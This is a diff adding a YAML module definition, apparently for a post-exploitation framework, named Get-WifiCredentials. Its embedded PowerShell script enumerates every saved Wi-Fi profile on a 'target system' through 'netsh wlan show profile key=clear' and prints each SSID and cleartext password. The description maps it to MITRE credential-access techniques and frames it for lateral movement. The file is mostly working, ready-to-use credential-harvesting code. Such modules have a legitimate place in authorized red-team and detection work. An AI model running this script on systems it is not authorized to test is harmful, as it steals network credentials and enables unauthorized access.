@@ -1,0 +1,133 @@
+name: Get-WifiCredentials
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Enumerates saved Wi-Fi profiles on the target system and extracts
+  stored passwords in cleartext. Uses the built-in netsh wlan commands
+  to list all saved wireless network profiles and retrieve their
+  security keys.
+
+  Can target a specific profile by name or enumerate all saved
+  profiles. Passwords are displayed in cleartext when available
+  (requires the key material to be stored locally). This information
+  can reveal network infrastructure details and potentially provide
+  credentials for lateral movement or network access.
+software: ''
+tactics: [TA0006, TA0007]
+techniques: [T1555, T1016.002]
+background: false
+output_extension:
+needs_admin: false
+opsec_safe: true
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: ProfileName
+    description: >-
+      Specific Wi-Fi profile name to query. If empty, enumerates all saved profiles.
+    required: false
+    value: ''
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Get-WifiCredentials {
+      param(
+          [string]$ProfileName
+      )
+
+      "[*] Wi-Fi Profile and Credential Discovery"
+      ""
+
+      # Check if WLAN service is available
+      $wlanCheck = netsh wlan show interfaces 2>&1
+      if ($wlanCheck -match "is not running" -or $wlanCheck -match "not find") {
+          "[!] Wireless LAN service is not available on this system"
+          return
+      }
+
+      if (-not [string]::IsNullOrWhiteSpace($ProfileName)) {
+          # Query a specific profile
+          "[*] Querying profile: $ProfileName"
+          ""
+          $output = netsh wlan show profile name="$ProfileName" key=clear 2>&1
+          if ($output -match "is not found") {
+              "[!] Profile '$ProfileName' not found"
+          } else {
+              $output | ForEach-Object { $_ }
+          }
+      } else {
+          # Enumerate all profiles
+          $profileOutput = netsh wlan show profiles 2>&1
+          $profileNames = @()
+          $profileOutput | ForEach-Object {
+              if ($_ -match "All User Profile\s*:\s*(.+)$") {
+                  $profileNames += $Matches[1].Trim()
+              }
+          }
+
+          if ($profileNames.Count -eq 0) {
+              "[*] No saved Wi-Fi profiles found"
+              return
+          }
+
+          "[+] Found $($profileNames.Count) saved Wi-Fi profile(s)"
+          ""
+          "=" * 70
+
+          foreach ($name in $profileNames) {
+              ""
+              "[*] Profile: $name"
+              "-" * 70
+
+              $details = netsh wlan show profile name="$name" key=clear 2>&1
+
+              $ssid = ""
+              $auth = ""
+              $cipher = ""
+              $keyContent = ""
+              $connMode = ""
+
+              $details | ForEach-Object {
+                  if ($_ -match "SSID name\s*:\s*(.+)$") {
+                      $ssid = $Matches[1].Trim().Trim('"')
+                  }
+                  if ($_ -match "Authentication\s*:\s*(.+)$") {
+                      $auth = $Matches[1].Trim()
+                  }
+                  if ($_ -match "Cipher\s*:\s*(.+)$") {
+                      $cipher = $Matches[1].Trim()
+                  }
+                  if ($_ -match "Key Content\s*:\s*(.+)$") {
+                      $keyContent = $Matches[1].Trim()
+                  }
+                  if ($_ -match "Connection mode\s*:\s*(.+)$") {
+                      $connMode = $Matches[1].Trim()
+                  }
+              }
+
+              "    SSID           : $ssid"
+              "    Authentication : $auth"
+              "    Cipher         : $cipher"
+              "    Connection Mode: $connMode"
+              if ($keyContent) {
+                  "    Password       : $keyContent"
+              } else {
+                  "    Password       : [not stored or open network]"
+              }
+              "-" * 70
+          }
+      }
+
+      ""
+      "[*] Wi-Fi discovery complete"
+  }
+script_end: Get-WifiCredentials {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
